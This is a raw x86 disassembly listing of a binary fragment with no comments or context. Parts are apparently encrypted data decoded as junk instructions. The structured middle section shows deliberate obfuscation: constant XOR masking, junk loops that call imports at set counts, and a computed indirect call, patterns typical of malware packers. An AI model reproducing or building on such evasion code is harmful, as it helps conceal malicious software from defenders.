  405008:	adc    DWORD PTR [ebp+0x77],0xffffffaf
  40500c:	jmp    0x405026
  40500e:	ror    DWORD PTR [ecx+0x42c3c7d4],0x60
  405015:	aaa    
  405016:	outs   dx,DWORD PTR ds:[esi]
  405017:	dec    esp
  405018:	retf   0xedf4
  40501b:	push   ebx
  40501c:	js     0x405073
  40501e:	leave  
  40501f:	nop
  405020:	fidiv  WORD PTR [esi]
  405022:	inc    edx
  405023:	ret    0x7dca
  405026:	dec    ecx
  405027:	mov    bl,0xbc
  405029:	mov    ch,0x9d
  40502b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40502c:	inc    esp
  40502d:	mov    cl,0x58
  40502f:	xchg   ebx,eax
  405030:	xchg   edi,eax
  405031:	mov    esp,0x8cdd83c8
  405036:	mov    ecx,0x4fc8c856
  40503b:	mov    ebp,0x3a842490
  405040:	xor    esi,DWORD PTR [esp+ecx*8]
  405043:	push   edx
  405044:	outs   dx,DWORD PTR ds:[esi]
  405045:	(bad)  
  405046:	mov    bl,0xb6
  405048:	loopne 0x4050a4
  40504a:	cmp    al,0xc7
  40504c:	mov    ah,0xf1
  40504e:	xor    al,0x27
  405050:	add    ebx,ebx
  405052:	adc    eax,0xced4d19d
  405057:	(bad)  
  405058:	scas   al,BYTE PTR es:[edi]
  405059:	adc    dl,dh
  40505b:	in     eax,dx
  40505c:	lods   al,BYTE PTR ds:[esi]
  40505d:	mov    WORD PTR cs:[ecx],fs
  405060:	push   esp
  405061:	aam    0x3e
  405063:	div    BYTE PTR [edi-0x3d]
  405066:	or     BYTE PTR [edx-0x4de99518],dh
  40506c:	enter  0xf583,0x4a
  405070:	retf   
  405071:	dec    esi
  405072:	dec    ecx
  405073:	lods   al,BYTE PTR ds:[esi]
  405074:	pop    ds
  405075:	nop
  405076:	hlt    
  405077:	inc    eax
  405078:	dec    edi
  405079:	jmp    0xa1b0:0xaff85a23
  405080:	add    ah,bl
  405082:	dec    edx
  405083:	inc    edi
  405084:	push   eax
  405085:	inc    ebx
  405086:	in     eax,0x73
  405088:	and    ch,BYTE PTR [ebp+0x27cfdb1]
  40508e:	sti    
  40508f:	fimul  DWORD PTR [edx+0x29]
  405092:	add    BYTE PTR [edi+0x67],ah
  405095:	adc    bl,BYTE PTR [ebx+0xc]
  405098:	mov    eax,ds:0x167ec3cf
  40509d:	out    0x9c,al
  40509f:	out    0x5,eax
  4050a1:	add    al,0x18
  4050a3:	mov    al,0x4b
  4050a5:	lock test DWORD PTR [ebx+0x73307929],0x7ead89b
  4050b0:	mov    ds:0x71517c3e,al
  4050b5:	jo     0x405092
  4050b7:	fst    st(6)
  4050b9:	out    dx,eax
  4050ba:	sahf   
  4050bb:	lods   eax,DWORD PTR ds:[esi]
  4050bc:	scas   al,BYTE PTR es:[edi]
  4050bd:	out    dx,al
  4050be:	or     DWORD PTR [eax],esi
  4050c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050c1:	ds mov bh,0x8a
  4050c4:	push   cs
  4050c5:	shl    BYTE PTR ss:0x48a9c15e,0x9a
  4050cd:	out    0xeb,eax
  4050cf:	aad    0x7a
  4050d1:	dec    esp
  4050d2:	xor    eax,esi
  4050d4:	mov    edi,0x286c7bc9
  4050d9:	test   DWORD PTR [ecx+ecx*1],esp
  4050dc:	(bad)  
  4050dd:	cmp    BYTE PTR [esi-0x56],al
  4050e0:	push   ss
  4050e1:	adc    ebx,DWORD PTR [ebp-0x77]
  4050e4:	(bad)  
  4050e5:	out    dx,eax
  4050e6:	sbb    ecx,ecx
  4050e8:	imul   esp,esp,0xffffffc9
  4050eb:	jle    0x4050e9
  4050ed:	sub    eax,0x51f3400f
  4050f2:	and    ah,BYTE PTR [esi-0x630d7d50]
  4050f8:	leave  
  4050f9:	push   ebp
  4050fa:	sub    BYTE PTR [esi-0x1a],al
  4050fd:	adc    BYTE PTR [edi-0xad84c9c],ch
  405103:	scas   al,BYTE PTR es:[edi]
  405104:	mov    esp,ebp
  405106:	call   0x5a1f9e74
  40510b:	fwait
  40510c:	lods   eax,DWORD PTR ds:[esi]
  40510d:	pushf  
  40510e:	test   al,0x97
  405110:	jb     0x40518e
  405112:	aam    0x7b
  405114:	daa    
  405115:	and    eax,0xf9e996dc
  40511a:	es js  0x4050da
  40511d:	lods   al,BYTE PTR ds:[esi]
  40511e:	mov    ds:0xf0f5fc55,al
  405123:	add    BYTE PTR [edx],dl
  405125:	dec    eax
  405126:	inc    esp
  405127:	dec    esi
  405128:	add    BYTE PTR [edx+0x592ca595],dl
  40512e:	cmp    DWORD PTR [esi+0x484b881e],ebp
  405134:	jge    0x405160
  405136:	inc    esp
  405137:	xchg   esi,eax
  405138:	and    eax,eax
  40513a:	xchg   ebx,eax
  40513b:	dec    ebx
  40513c:	dec    edi
  40513d:	jbe    0x4051b6
  40513f:	mov    ecx,0xcd5b23c6
  405144:	stos   DWORD PTR es:[edi],eax
  405145:	je     0x405125
  405147:	aas    
  405148:	xor    DWORD PTR [ebp+0x49],esi
  40514b:	scas   al,BYTE PTR es:[edi]
  40514c:	ja     0x405122
  40514e:	add    bh,ah
  405150:	fidiv  DWORD PTR [edx]
  405152:	enter  0xe71c,0xcc
  405156:	(bad)  
  405157:	and    bh,BYTE PTR [edx]
  405159:	loope  0x4050fb
  40515b:	sub    BYTE PTR [ebx-0x40],dh
  40515e:	mov    eax,ds:0x5a124b9a
  405163:	mov    ebp,0x7a5ba6ec
  405168:	rcr    DWORD PTR [ecx+0x7c],0x59
  40516c:	sti    
  40516d:	repz dec edx
  40516f:	push   ebp
  405170:	fucom  st(2)
  405172:	mov    eax,0x466d72a5
  405177:	mov    edi,0x9b424fa0
  40517c:	stc    
  40517d:	nop
  40517e:	ins    BYTE PTR es:[edi],dx
  40517f:	jnp    0x4051e0
  405181:	xchg   BYTE PTR [eax-0x52],dl
  405184:	shr    BYTE PTR [ecx+0x723fba5],1
  40518a:	add    DWORD PTR [ecx+0x12],ebp
  40518d:	or     al,0xa4
  40518f:	or     eax,0xd5a25637
  405194:	pop    esi
  405195:	sub    DWORD PTR [edi+0x59],esp
  405198:	cmp    eax,0x8e2be716
  40519d:	add    BYTE PTR [ecx+0x2b3b80d2],ah
  4051a3:	pop    edx
  4051a4:	outs   dx,DWORD PTR ds:[esi]
  4051a5:	cld    
  4051a6:	test   DWORD PTR [edi+0x6227c9bc],esp
  4051ac:	sbb    al,cl
  4051ae:	fst    DWORD PTR [ebx-0xb]
  4051b1:	je     0x4051ce
  4051b3:	nop
  4051b4:	stc    
  4051b5:	rcl    ch,1
  4051b7:	dec    ebx
  4051b8:	jge    0x40513b
  4051ba:	ror    bx,1
  4051bd:	(bad)  
  4051be:	shl    BYTE PTR [esi+0x6397d470],cl
  4051c4:	(bad)  
  4051c5:	out    0x1d,eax
  4051c7:	xchg   DWORD PTR [esi],eax
  4051c9:	pop    es
  4051ca:	jge    0x40520b
  4051cc:	imul   edi,DWORD PTR [edx],0xffffffb1
  4051cf:	leave  
  4051d0:	(bad)  
  4051d2:	inc    eax
  4051d3:	inc    esp
  4051d4:	mov    bh,0x2a
  4051d6:	or     bl,BYTE PTR [ecx+0x42daab75]
  4051dc:	cdq    
  4051dd:	popaw  
  4051df:	sbb    eax,0x430f142d
  4051e4:	cmp    al,0xca
  4051e6:	mov    esi,0x46c4bdd1
  4051eb:	jbe    0x405185
  4051ed:	adc    ah,ah
  4051ef:	in     al,dx
  4051f0:	jp     0x405216
  4051f2:	repz cmp eax,0x7ef7577b
  4051f8:	test   DWORD PTR [ebx+esi*1-0xe],ebp
  4051fc:	sub    ecx,eax
  4051fe:	xchg   DWORD PTR [edi+edx*2],ecx
  405201:	sub    BYTE PTR [eax-0x1d36b3ba],bl
  405207:	or     DWORD PTR [eax],edx
  405209:	mov    ds:0xf2e013a1,al
  40520e:	sub    DWORD PTR [esi],0x5b
  405211:	aad    0xdc
  405213:	sub    cl,BYTE PTR [esi+eax*4-0x52]
  405217:	test   eax,0x3edb91a3
  40521c:	fidiv  DWORD PTR [ebp+0xf]
  40521f:	test   ebp,ecx
  405221:	ret    0xc333
  405224:	add    eax,0x3272dc
  405229:	jmp    0x405392
  40522e:	mov    ecx,DWORD PTR [ebp-0x38]
  405231:	add    ecx,DWORD PTR [ebp+0x8]
  405234:	mov    DWORD PTR [ebp-0x10],ecx
  405237:	mov    ecx,DWORD PTR [ebp-0x1c]
  40523a:	test   ecx,ecx
  40523c:	je     0x40531d
  405242:	mov    DWORD PTR [ebp-0x20],0x0
  405249:	push   0x3
  40524b:	xor    edx,edx
  40524d:	pop    edx
  40524e:	add    edx,0x8
  405251:	push   edx
  405252:	pop    ecx
  405253:	push   0x6
  405255:	dec    ecx
  405256:	pop    ebx
  405257:	dec    ebx
  405258:	xchg   ebx,ecx
  40525a:	sub    ebx,ecx
  40525c:	xchg   ebx,ecx
  40525e:	dec    ecx
  40525f:	mov    eax,DWORD PTR [ebp-0x1c]
  405262:	imul   eax,ecx
  405265:	sub    esp,eax
  405267:	mov    DWORD PTR [ebp-0x20],esp
  40526a:	mov    eax,DWORD PTR [ebp-0x4]
  40526d:	mov    ecx,0x7510894
  405272:	xor    eax,ecx
  405274:	mov    edx,0x3272dc
  405279:	add    eax,edx
  40527b:	mov    DWORD PTR [ebp+0x8],eax
  40527e:	mov    eax,DWORD PTR [ebp-0x14]
  405281:	xor    eax,ecx
  405283:	add    eax,edx
  405285:	mov    edx,DWORD PTR [ebp+0x14]
  405288:	imul   eax,DWORD PTR [edx]
  40528b:	mov    edx,DWORD PTR [ebp-0x4]
  40528e:	xor    edx,ecx
  405290:	mov    ecx,DWORD PTR [ebp+0x8]
  405293:	lea    ecx,[edx+ecx*1+0x3272dc]
  40529a:	cmp    ecx,eax
  40529c:	je     0x405313
  4052a2:	mov    edi,DWORD PTR [ebp-0x14]
  4052a5:	mov    eax,DWORD PTR [ebp+0x8]
  4052a8:	mov    edx,DWORD PTR [ebp+0x14]
  4052ab:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4052af:	mov    ecx,0x7510894
  4052b4:	xor    edx,edx
  4052b6:	xor    edi,ecx
  4052b8:	mov    esi,0x3272dc
  4052bd:	add    edi,esi
  4052bf:	div    edi
  4052c1:	mov    edx,DWORD PTR [ebp-0x4]
  4052c4:	xor    edx,ecx
  4052c6:	lea    eax,[edx+eax*1+0x3272dc]
  4052cd:	mov    edx,DWORD PTR [ebp+0x8]
  4052d0:	mov    edi,DWORD PTR [ebp-0x20]
  4052d3:	mov    DWORD PTR [edi+edx*4],eax
  4052d6:	mov    eax,DWORD PTR [ebp-0x14]
  4052d9:	mov    edx,DWORD PTR [ebp+0x8]
  4052dc:	xor    eax,ecx
  4052de:	lea    eax,[eax+edx*1+0x3272dc]
  4052e5:	mov    DWORD PTR [ebp+0x8],eax
  4052e8:	mov    eax,DWORD PTR [ebp-0x14]
  4052eb:	mov    edx,DWORD PTR [ebp+0x14]
  4052ee:	xor    eax,ecx
  4052f0:	add    eax,esi
  4052f2:	imul   eax,DWORD PTR [edx]
  4052f5:	mov    edx,DWORD PTR [ebp-0x4]
  4052f8:	xor    edx,ecx
  4052fa:	mov    ecx,DWORD PTR [ebp+0x8]
  4052fd:	lea    ecx,[edx+ecx*1+0x3272dc]
  405304:	cmp    ecx,eax
  405306:	jne    0x4052a2
  40530c:	mov    eax,esi
  40530e:	jmp    0x405318
  405313:	mov    eax,0x3272dc
  405318:	mov    ebx,0x7510894
  40531d:	mov    ecx,DWORD PTR [ebp-0x4]
  405320:	xor    ecx,ebx
  405322:	add    ecx,eax
  405324:	mov    DWORD PTR [ebp-0xc],ecx
  405327:	mov    ebx,0x65655
  40532c:	add    ebx,0x3234
  405332:	xchg   ebx,esi
  405334:	xor    ebx,ebx
  405336:	push   esi
  405337:	mov    esi,ebx
  405339:	pop    ebx
  40533a:	mov    edx,esi
  40533c:	add    ebx,0x1002
  405342:	lea    eax,[ebp-0x10]
  405345:	add    edx,eax
  405347:	add    edx,0x5
  40534a:	push   edx
  40534b:	inc    esi
  40534c:	pop    ecx
  40534d:	dec    ecx
  40534e:	xchg   ecx,eax
  40534f:	dec    eax
  405350:	xchg   ecx,eax
  405351:	dec    ecx
  405352:	xchg   ecx,edx
  405354:	dec    edx
  405355:	push   edx
  405356:	mov    edx,ebx
  405358:	pop    ebx
  405359:	dec    ebx
  40535a:	call   DWORD PTR [ebx]
  40535c:	cmp    DWORD PTR [ebp+0x10],esi
  40535f:	je     0x40537e
  405365:	xchg   edx,eax
  405366:	push   0xb
  405368:	pop    ecx
  405369:	push   0x4
  40536b:	pop    ebx
  40536c:	inc    ebx
  40536d:	xchg   ebx,ecx
  40536f:	sub    ebx,ecx
  405371:	xchg   ebx,ecx
  405373:	dec    ecx
  405374:	dec    ecx
  405375:	mov    eax,DWORD PTR [ebp-0x1c]
  405378:	imul   eax,ecx
  40537b:	add    esp,eax
  40537d:	xchg   edx,eax
  40537e:	push   eax
  40537f:	xor    ebx,ebx
  405381:	mov    edx,esp
  405383:	dec    edx
  405384:	inc    ebx
  405385:	add    ebx,DWORD PTR [edx+ebx*1]
  405388:	dec    ebx
  405389:	xor    edx,edx
  40538b:	add    DWORD PTR [ebp-0xc],ebx
  40538e:	pop    ebx
  40538f:	mov    eax,DWORD PTR [ebp-0xc]
  405392:	pop    edi
  405393:	pop    esi
  405394:	pop    ebx
  405395:	leave  
  405396:	ret    0x10
  405399:	push   ebp
  40539a:	mov    ebp,esp
  40539c:	sub    esp,0x18
  40539f:	and    DWORD PTR ds:0x413c1e,0x0
  4053a9:	mov    ecx,DWORD PTR ds:0x413c1e
  4053af:	inc    ecx
  4053b0:	mov    DWORD PTR ds:0x413c1e,ecx
  4053b6:	cmp    DWORD PTR ds:0x413c1e,0x8
  4053bd:	jne    0x4053d7
  4053c3:	push   DWORD PTR [ebp-0x20]
  4053c6:	push   0x413cf0
  4053cb:	push   DWORD PTR [ebp-0x24]
  4053ce:	push   DWORD PTR [ebp-0x14]
  4053d1:	call   DWORD PTR ds:0x416770
  4053d7:	cmp    DWORD PTR ds:0x413c1e,0x7
  4053de:	jne    0x4053f3
  4053e4:	xor    ecx,ecx
  4053e6:	or     ecx,DWORD PTR ds:0x413c1e
  4053ec:	inc    ecx
  4053ed:	mov    DWORD PTR ds:0x413c1e,ecx
  4053f3:	cmp    DWORD PTR ds:0x413c1e,0x1f
  4053fa:	jb     0x4053a9
  405400:	and    DWORD PTR ds:0x413c12,ecx
  405406:	mov    DWORD PTR [ebp-0x10],0xf89f85b0
  40540d:	xor    edx,edx
  40540f:	or     edx,DWORD PTR ds:0x413cc0
  405415:	mov    edx,DWORD PTR [edx]
  405417:	and    DWORD PTR ds:0x413ce8,edx
  40541d:	lea    eax,[ebp+0x14]
  405420:	mov    DWORD PTR [ebp-0x4],eax
  405423:	push   esi
  405424:	adc    edx,ecx
  405426:	mov    esi,0xf89c85b0
  40542b:	mov    DWORD PTR [ebp-0xc],esi
  40542e:	and    DWORD PTR ds:0x413c74,0x0
  405438:	jmp    0x40544a
  40543d:	mov    edx,DWORD PTR ds:0x413c74
  405443:	inc    edx
  405444:	mov    DWORD PTR ds:0x413c74,edx
  40544a:	cmp    DWORD PTR ds:0x413c74,0x1a
  405451:	jae    0x405550
  405457:	cmp    DWORD PTR ds:0x413c74,0x10
  40545e:	jne    0x40547c
  405464:	push   0x41401c
  405469:	push   DWORD PTR [ebp-0x14]
  40546c:	push   0x416140
  405471:	push   0x4161b2
  405476:	call   DWORD PTR ds:0x416774
  40547c:	cmp    DWORD PTR ds:0x413c74,0xf
  405483:	jne    0x405498
  405489:	xor    edx,edx
  40548b:	add    edx,DWORD PTR ds:0x413c74
  405491:	inc    edx
  405492:	mov    DWORD PTR ds:0x413c74,edx
  405498:	jmp    0x40543d
  40549d:	and    DWORD PTR ds:0x413c0e,0x0
  4054a7:	jmp    0x4054b9
  4054ac:	mov    ecx,DWORD PTR ds:0x413c0e
  4054b2:	inc    ecx
  4054b3:	mov    DWORD PTR ds:0x413c0e,ecx
  4054b9:	cmp    DWORD PTR ds:0x413c0e,0x16
  4054c0:	jae    0x405550
  4054c6:	cmp    DWORD PTR ds:0x413c0e,0x7
  4054cd:	jne    0x4054e8
  4054d3:	push   0x1925
  4054d8:	push   0x413c1a
  4054dd:	push   0x416140
  4054e2:	call   DWORD PTR ds:0x416778
  4054e8:	cmp    DWORD PTR ds:0x413c0e,0x6
  4054ef:	jne    0x405504
  4054f5:	xor    ecx,ecx
  4054f7:	or     ecx,DWORD PTR ds:0x413c0e
  4054fd:	inc    ecx
  4054fe:	mov    DWORD PTR ds:0x413c0e,ecx
  405504:	jmp    0x4054ac
  405509:	mov    DWORD PTR ds:0x413d1c,0x15
  405513:	cmp    DWORD PTR ds:0x413d1c,0x0
  40551a:	je     0x405550
  405520:	cmp    DWORD PTR ds:0x413d1c,0x21
  405527:	jne    0x405538
  40552d:	push   0x416025
  405532:	call   DWORD PTR ds:0x41677c
  405538:	mov    ecx,DWORD PTR ds:0x413d1c
  40553e:	dec    ecx
  40553f:	mov    DWORD PTR ds:0x413d1c,ecx
  405545:	jmp    0x405513
  40554a:	adc    edx,0x7769
  405550:	lea    eax,[ebp-0xc]
  405553:	mov    DWORD PTR [ebp-0x14],eax
  405556:	or     eax,DWORD PTR ds:0x413c0a
  40555c:	mov    eax,DWORD PTR [ebp-0xc]
  40555f:	and    edx,edx
  405561:	mov    edx,DWORD PTR [ebp-0x14]
  405564:	mov    ecx,0x7510894
  405569:	xor    eax,ecx
  40556b:	add    eax,0x3272dc
  405570:	mov    DWORD PTR [edx],eax
  405572:	and    DWORD PTR ds:0x413d34,0x0
  40557c:	jmp    0x40558c
  405581:	mov    eax,ds:0x413d34
  405586:	inc    eax
  405587:	mov    ds:0x413d34,eax
  40558c:	cmp    DWORD PTR ds:0x413d34,0x17
  405593:	jae    0x4055dc
  405599:	cmp    DWORD PTR ds:0x413d34,0x8
  4055a0:	jne    0x4055b9
  4055a6:	push   0x413cec
  4055ab:	push   DWORD PTR [ebp-0x24]
  4055ae:	push   0x416049
  4055b3:	call   DWORD PTR ds:0x416780
  4055b9:	cmp    DWORD PTR ds:0x413d34,0x7
  4055c0:	jne    0x4055d1
  4055c6:	mov    eax,ds:0x413d34
  4055cb:	inc    eax
  4055cc:	mov    ds:0x413d34,eax
  4055d1:	jmp    0x405581
  4055d6:	and    edx,DWORD PTR ds:0x413bfe
  4055dc:	mov    eax,ds:0x41622c
  4055e1:	mov    edx,DWORD PTR [ebp-0x4]
  4055e4:	add    DWORD PTR ds:0x413bf6,0x4ad3
  4055ee:	mov    eax,DWORD PTR [eax]
  4055f0:	add    eax,DWORD PTR [edx]
  4055f2:	sbb    DWORD PTR ds:0x413c80,0x777b
  4055fc:	push   edi
  4055fd:	xor    DWORD PTR ds:0x413c06,ebx
  405603:	mov    DWORD PTR [ebp-0x8],eax
  405606:	mov    edi,DWORD PTR [ebp+0x8]
  405609:	movzx  eax,BYTE PTR ds:0x413d28
  405610:	sub    DWORD PTR ds:0x413c06,eax
  405616:	mov    eax,ds:0x4163b4
  40561b:	mov    eax,DWORD PTR [eax+0x198]
  405621:	adc    edx,DWORD PTR ds:0x414010
  405627:	xor    edi,ecx
  405629:	mov    edx,0x3272dc
  40562e:	add    DWORD PTR ds:0x413c1a,0x413cd8
  405638:	add    edi,edx
  40563a:	mov    DWORD PTR ds:0x413d28,0x4988
  405644:	cmp    DWORD PTR [eax],edi
  405646:	je     0x40565d
  40564c:	mov    eax,DWORD PTR [eax]
  40564e:	mov    DWORD PTR ds:0x413ce4,0xf81
  405658:	jmp    0x407c4a
  40565d:	mov    eax,DWORD PTR [ebp+0x18]
  405660:	mov    DWORD PTR ds:0x413c06,0x7bbf
  40566a:	cmp    eax,esi
  40566c:	mov    DWORD PTR ds:0x413d30,0x2bf7
  405676:	jne    0x405686
  40567c:	push   0xf89c85b1
  405681:	jmp    0x407c39
  405686:	mov    esi,DWORD PTR [ebp+0x18]
  405689:	movzx  eax,WORD PTR ds:0x413cf0
  405690:	mov    eax,0xf89c85b2
  405695:	cmp    esi,eax
  405697:	jne    0x407c29
  40569d:	mov    eax,DWORD PTR [ebp+0x10]
  4056a0:	inc    DWORD PTR ds:0x413c80
  4056a6:	xor    eax,ecx
  4056a8:	add    eax,edx
  4056aa:	mov    DWORD PTR [ebp-0x18],eax
  4056ad:	adc    DWORD PTR ds:0x413d1c,0x3347
  4056b7:	mov    eax,DWORD PTR [ebp+0xc]
  4056ba:	mov    esi,DWORD PTR [ebp-0x8]
  4056bd:	xor    eax,ecx
  4056bf:	sbb    DWORD PTR ds:0x413ce4,0x413c70
  4056c9:	add    eax,edx
  4056cb:	imul   eax,DWORD PTR [esi]
  4056ce:	and    DWORD PTR ds:0x413c0a,ebx
  4056d4:	mov    esi,DWORD PTR [ebp+0x8]
  4056d7:	and    DWORD PTR ds:0x413d24,0x413c02
  4056e1:	xor    esi,ecx
  4056e3:	add    esi,edx
  4056e5:	cmp    esi,eax
  4056e7:	movzx  eax,BYTE PTR ds:0x413cf0
  4056ee:	mov    eax,DWORD PTR [ebp-0x4]
  4056f1:	push   ebx
  4056f2:	mov    DWORD PTR ds:0x414000,0x6197
  4056fc:	je     0x40577e
  405702:	and    DWORD PTR ds:0x413c1e,0x0
  40570c:	jmp    0x40571e
  405711:	mov    esi,DWORD PTR ds:0x413c1e
  405717:	inc    esi
  405718:	mov    DWORD PTR ds:0x413c1e,esi
  40571e:	cmp    DWORD PTR ds:0x413c1e,0x14
  405725:	jae    0x405765
  40572b:	cmp    DWORD PTR ds:0x413c1e,0xa
  405732:	jne    0x405746
  405738:	push   0x413d1c
  40573d:	push   DWORD PTR [ebp-0x24]
  405740:	call   DWORD PTR ds:0x416784
  405746:	cmp    DWORD PTR ds:0x413c1e,0x9
  40574d:	jne    0x405760
  405753:	mov    esi,DWORD PTR ds:0x413c1e
  405759:	inc    esi
  40575a:	mov    DWORD PTR ds:0x413c1e,esi
  405760:	jmp    0x405711
  405765:	mov    esi,DWORD PTR [ebp-0x18]
  405768:	add    DWORD PTR [eax],esi
  40576a:	mov    eax,DWORD PTR [ebp-0x4]
  40576d:	mov    esi,DWORD PTR [ebp+0xc]
  405770:	xor    esi,ecx
  405772:	add    esi,edx
  405774:	imul   esi,DWORD PTR [eax]
  405777:	mov    DWORD PTR [eax],esi
  405779:	jmp    0x405783
  40577e:	mov    esi,DWORD PTR [ebp+0x14]
  405781:	xor    DWORD PTR [eax],esi
  405783:	mov    eax,DWORD PTR [ebp-0x4]
  405786:	mov    edi,DWORD PTR [ebp+0x10]
  405789:	xor    edi,ecx
  40578b:	mov    esi,0xffcd8d24
  405790:	mov    ebx,esi
  405792:	sub    ebx,edi
  405794:	add    DWORD PTR [eax],ebx
  405796:	mov    eax,DWORD PTR [ebp-0x4]
  405799:	mov    edi,DWORD PTR [ebp-0x8]
  40579c:	add    edi,DWORD PTR [eax]
  40579e:	mov    DWORD PTR [ebp-0x8],edi
  4057a1:	mov    eax,DWORD PTR [ebp+0xc]
  4057a4:	mov    edi,DWORD PTR [ebp+0xc]
  4057a7:	xor    edi,ecx
  4057a9:	xor    eax,ecx
  4057ab:	lea    eax,[eax+edi*1+0x64e5b8]
  4057b2:	mov    edi,DWORD PTR [ebp+0xc]
  4057b5:	xor    edi,ecx
  4057b7:	add    edi,edx
  4057b9:	imul   eax,edi
  4057bc:	mov    edi,DWORD PTR [ebp+0xc]
  4057bf:	xor    edi,ecx
  4057c1:	sub    edi,eax
  4057c3:	mov    eax,DWORD PTR [ebp-0x4]
  4057c6:	add    edi,edx
  4057c8:	cmp    DWORD PTR [eax],edi
  4057ca:	mov    eax,DWORD PTR [ebp-0x4]
  4057cd:	mov    edi,DWORD PTR [ebp+0x10]
  4057d0:	jg     0x4057e3
  4057d6:	xor    edi,ecx
  4057d8:	mov    ebx,esi
  4057da:	sub    ebx,edi
  4057dc:	add    DWORD PTR [eax],ebx
  4057de:	jmp    0x4057e9
  4057e3:	xor    edi,ecx
  4057e5:	add    edi,edx
  4057e7:	add    DWORD PTR [eax],edi
  4057e9:	mov    eax,DWORD PTR [ebp-0x8]
  4057ec:	mov    edi,DWORD PTR [ebp-0x10]
  4057ef:	mov    eax,DWORD PTR [eax]
  4057f1:	jmp    0x407b3d
  4057f6:	imul   ebp,DWORD PTR [edx+0x66],0xaba967a5
  4057fd:	stos   BYTE PTR es:[edi],al
  4057fe:	(bad)  
  4057ff:	sbb    eax,0x654994ee
  405804:	dec    edx
  405805:	popf   
  405806:	loopne 0x405867
  405808:	jl     0x405886
  40580a:	dec    ebx
  40580b:	pop    edi
  40580c:	jl     0x40588a
  40580e:	sti    
  40580f:	pushf  
  405810:	fs dec ebx
  405812:	pop    ecx
  405813:	pusha  
  405814:	out    0xd1,eax
  405816:	les    ebp,FWORD PTR [eax-0x11298993]
  40581c:	or     DWORD PTR ds:0xcc554626,edi
  405822:	xor    ebx,0xe4bef3fe
  405828:	mov    al,ds:0xab3f6f83
  40582d:	repz inc cl
  405830:	sub    eax,0x15b9c45f
  405835:	retf   0x281f
  405838:	and    ah,BYTE PTR [eax-0x15677664]
  40583e:	idiv   BYTE PTR [esi]
  405840:	sub    DWORD PTR [edi],0xffffffd7
  405843:	ds mov dl,0x92
  405846:	dec    ebx
  405847:	sbb    al,0x9b
  405849:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40584a:	rol    dl,cl
  40584c:	pop    ebp
  40584d:	mov    esi,0x96609811
  405852:	js     0x40586f
  405854:	jnp    0x4058c4
  405856:	add    DWORD PTR [ebx+0x6635d611],ebp
  40585c:	lods   al,BYTE PTR ds:[esi]
  40585d:	(bad)
  405860:	xlat   BYTE PTR ds:[ebx]
  405861:	mov    eax,ds:0x15ec9f95
  405866:	push   edi
  405867:	mov    eax,ds:0x67550f3d
  40586c:	inc    ebx
  40586d:	jno    0x4058e5
  40586f:	mov    dl,0x63
  405871:	mov    ch,0x66
  405873:	inc    eax
  405874:	outs   dx,DWORD PTR ds:[esi]
  405875:	aas    
  405876:	mov    DWORD PTR [edx-0x4bf00aad],edi
  40587c:	out    0x19,eax
  40587e:	clc    
  40587f:	sti    
  405880:	adc    ebp,DWORD PTR [eax-0x9]
  405883:	ret    
  405884:	sub    DWORD PTR [edi+0x3cabfa07],ebx
  40588a:	aam    0xe4
  40588c:	mov    BYTE PTR [ebx+0x59],bh
  40588f:	and    bh,BYTE PTR [ecx+0x1f6fa0d0]
  405895:	pusha  
  405896:	mov    al,0x4c
  405898:	popa   
  405899:	mov    DWORD PTR [edi+0x3d],ebp
  40589c:	jae    0x4058be
  40589e:	sahf   
  40589f:	test   DWORD PTR [ecx+0x22],esi
  4058a2:	je     0x4058bf
  4058a4:	fmul   DWORD PTR [ebx+0x78bd3b14]
  4058aa:	jno    0x405926
  4058ac:	push   ds
  4058ad:	mov    al,0x97
  4058af:	and    BYTE PTR [esi+0x18],bh
  4058b2:	int3   
  4058b3:	cwde   
  4058b4:	call   0xefd9:0x58a05b5e
  4058bb:	mov    DWORD PTR [ecx+ebx*1-0x57],0xb7fe3f8c
  4058c3:	mov    dh,0x8f
  4058c5:	jb     0x4058f1
  4058c7:	mov    dl,BYTE PTR [edx-0x390f1fa9]
  4058cd:	scas   eax,DWORD PTR es:[edi]
  4058ce:	cwde   
  4058cf:	jmp    0xedf5a3a
  4058d4:	imul   ebx,DWORD PTR gs:[ebx],0x4c1b8147
  4058db:	sti    
  4058dc:	sbb    eax,0xdea034ea
  4058e1:	jl     0x405914
  4058e3:	mov    ebx,0x1488312e
  4058e8:	jnp    0x40590b
  4058ea:	test   BYTE PTR [ebp+0x7d3252fa],dh
  4058f0:	mov    ss,WORD PTR [edx-0x3be2d855]
  4058f6:	(bad)  
  4058f7:	mov    ds:0xcc735d6,eax
  4058fc:	pop    ecx
  4058fd:	jns    0x4058f1
  4058ff:	or     cl,al
  405901:	dec    eax
  405902:	pop    edi
  405903:	mov    esp,0xc290ff21
  405908:	test   al,0x0
  40590b:	mov    dl,0x5d
  40590d:	xor    DWORD PTR [eax],edi
  40590f:	shl    BYTE PTR [ebp-0x69],1
  405912:	iret   
  405913:	mov    cl,BYTE PTR ds:0xe7adeb04
  405919:	mov    eax,ds:0x746b0cc0
  40591e:	pop    ebp
  40591f:	inc    ebp
  405920:	mov    al,0xe3
  405922:	dec    eax
  405923:	adc    BYTE PTR [ebx+0x75642eb],dl
  405929:	mov    WORD PTR [edi-0x7d25fb60],es
  40592f:	xor    eax,0xe8fb154d
  405934:	cwde   
  405935:	push   ss
  405936:	push   0xb6ec3086
  40593b:	jmp    0x82fc0d00
  405940:	fldcw  WORD PTR [edi-0x3c]
  405943:	xor    ecx,DWORD PTR [edi-0x18145237]
  405949:	inc    ecx
  40594a:	mov    ah,0xbd
  40594c:	mov    WORD PTR [edi-0x4ba52d19],cs
  405952:	xor    al,0x25
  405954:	(bad)  
  405955:	and    ebx,edi
  405957:	mov    eax,0x8f0d431b
  40595c:	adc    al,ch
  40595e:	mov    WORD PTR [eax-0x6f],es
  405961:	stc    
  405962:	repnz inc esi
  405964:	leave  
  405965:	jo     0x405922
  405967:	mov    al,0xf9
  405969:	test   WORD PTR [edi],si
  40596c:	rol    DWORD PTR [ebp-0x63],1
  40596f:	pusha  
  405970:	pusha  
  405971:	popa   
  405972:	add    BYTE PTR [ecx],dh
  405974:	push   ecx
  405975:	xor    al,0x5e
  405977:	cdq    
  405978:	xchg   esp,ebp
  40597a:	pop    edx
  40597b:	iret   
  40597c:	cmc    
  40597d:	jb     0x405933
  40597f:	mov    edx,0xf80338c8
  405984:	dec    eax
  405985:	cli    
  405986:	cmp    ebp,esp
